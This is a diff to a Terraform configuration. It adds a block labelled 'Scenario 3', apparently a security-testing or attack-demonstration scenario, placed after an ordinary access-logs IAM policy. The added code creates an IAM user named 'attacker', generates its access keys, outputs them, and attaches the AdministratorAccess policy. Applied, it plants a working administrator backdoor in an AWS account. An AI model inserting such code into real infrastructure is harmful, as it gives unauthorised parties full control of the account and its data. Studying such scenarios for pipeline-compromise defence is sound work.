@@ -394,3 +394,33 @@ data "aws_iam_policy_document" "access_logs" {
   }
 }
 
+
+## Scenario 3 - Create user within the Builder account with AdministratorAccess policy and output keys
+
+# 1. Create "attacker" user
+resource "aws_iam_user" "attacker" {
+  name = "attacker"
+  path = "/system/"
+}
+
+# 2. Generate and output keys
+resource "aws_iam_access_key" "attacker" {
+  user = aws_iam_user.attacker.name
+}
+
+output "attacker_access_key_id" {
+  value = aws_iam_access_key.attacker.id
+}
+
+output "attacker_access_key_secret" {
+  value     = aws_iam_access_key.attacker.secret
+  sensitive = true
+}
+
+# 3. Attach AdministratorAccess policy to attacker
+resource "aws_iam_user_policy_attachment" "attacker-attach" {
+  user       = aws_iam_user.attacker.name
+  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+}
+
+
